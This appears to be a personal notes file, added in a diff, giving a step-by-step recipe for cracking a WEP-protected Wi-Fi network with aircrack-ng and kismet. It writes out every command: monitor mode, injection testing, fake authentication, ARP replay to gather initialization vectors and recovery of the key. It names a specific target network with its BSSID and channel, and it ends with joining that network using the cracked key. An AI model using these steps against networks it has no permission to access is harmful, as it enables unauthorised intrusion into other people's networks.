@@ -1,0 +1,73 @@
+http://www.aircrack-ng.org/doku.php?id=simple_wep_crack
+
+what we need:
+	aircrack-ng
+	kismet
+
+get root permissions
+$ sudo -i
+
+open up 3 terminals
+
+get wireless card MAC address
+$ ifconfig wlan1
+mac=00:C0:CA:40:B1:B8
+
+check for wireless network(s)
+$ kismet
+
+h = help
+x = close popup window
+s = sort
+s = SSID
+scroll to actt
+i = detailed information
+
+essid=actt
+bssid=00:25:9C:41:31:DE
+chan=6
+
+x = close popup window
+Q = quit
+sometimes you also need ctrl+c
+
+start wireless in monitor mode
+$ airmon-ng start wlan1 $chan
+
+note that it started mon0 (monitor mode enabled)
+
+test if we can inject packets to the access point
+$ aireplay-ng -9 -e $essid -a $bssid mon0
+
+start capturing initialization vectors
+$ airodump-ng -c $chan --bssid $bssid -w output mon0
+
+in another terminal do a fake authentication with the AP
+$ aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0
+
+start relaying ARP requests
+$ aireplay-ng -3 -b $bssid -h $mac mon0
+nothing is currently relayed because nothing is on the network
+
+in another terminal generate ARP requests by pinging an invalid IP address
+(make sure you are connected via Ethernet or another wireless NIC)
+(actually, simply connecting to the network via Ethernet will generate an ARP request)
+$ ping 192.168.1.222
+
+check other terminals to see if you are relaying ARP packets and capturing them
+
+in another terminal start cracking
+$ aircrack-ng -b $bssid output*.cap
+
+wait for the key to be cracked
+
+key=
+
+once done stop all relaying, capturing and pinging
+stop wireless monitor mode
+$ airmon-ng stop wlan1
+$ airmon-ng stop mon0
+
+connect to the wireless network normally with the cracked key
+we're in!
+
